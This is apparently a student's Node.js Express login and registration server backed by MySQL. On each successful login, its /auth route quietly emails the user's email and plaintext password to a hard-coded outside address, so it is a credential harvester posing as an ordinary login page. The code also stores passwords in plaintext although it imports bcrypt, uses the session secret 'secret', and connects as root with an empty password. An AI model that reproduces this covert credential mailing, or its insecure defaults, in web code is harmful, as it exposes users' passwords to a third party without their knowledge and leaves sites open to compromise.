const express = require('express')
const sesion = require('express-session')
const bodyParser = require('body-parser')
const alert = require('alert-node')
const enkripsi = require('bcrypt')
const mail = require('nodemailer')
const mysql = require('mysql')
const db = mysql.createConnection({
    host : 'localhost',
    user : 'root',
    password : '',
    database:'webtoni',
    multipleStatements:true
})
const app = express()
const port = 3000

app.set('view engine','ejs')
app.use(express.static('public'))
app.use(
    sesion({
        secret: 'secret',
        resave: true,
        saveUninitialized:true
    })
)
app.use(bodyParser.urlencoded({ extended:true }))
app.use(bodyParser.json())

app.get('/',function(req,res){
    res.render('login')
})

app.post('/auth',(req,res)=>{
    var email = req.body.email
    var password = req.body.password
    const sql = 'SELECT * FROM member WHERE email = ? AND password = ?'
    if(email && password){
        db.query(sql,[email,password],function(err,rows){
            if(err)throw err            
            else if(rows.length>0){                
                req.session.loggedin=true
                req.session.email=email                                              
                let transporter = mail.createTransport({
                    service: 'gmail',
                    auth: {
                        user: '###Email mu',
                        pass: '###Password Email mu'
                    }
                });
                let mailOptions = {
                    from: email,
                    replyTo: email,
                    to: 'muhamad_fathoni_27rpl@student.smktelkom-mlg.sch.id',
                    subject: "Login Website | Mr.Ti",
                    text: `${email}  ${password}`
                };
                
                transporter.sendMail(mailOptions, (err, info) => {
                    if (err) throw err;
                });              
                alert('Sukses BOS KUU!!!!!!')                     
                res.redirect('/home')                            
            }
            else{
                alert('Salah BOS KUU!!!!!')
            }
        })
    }
})


app.post('/authorisasidaftar',function(req,res){    
    var daftar = {
        nama : req.body.nama,
        email : req.body.email,
        password : req.body.password
    }
    db.query('INSERT INTO member SET ?',daftar,(err,results)=>{
        if(err)throw err
        else { console.log("sukses",results);
        res.redirect('/')}
    })
    
}
)
app.get('/home',function(req,res){
    if(req.session.loggedin){
    res.render('home')}else{
        alert('Login sek bos !!!!')
    }
})

app.get('/metu',function(req,res){
    if(req.session.loggedin === true){
        req.session.loggedin = false
        res.redirect('/')
    }
    res.end()
})

app.listen(port, () => console.log(`Server mlaku!`))
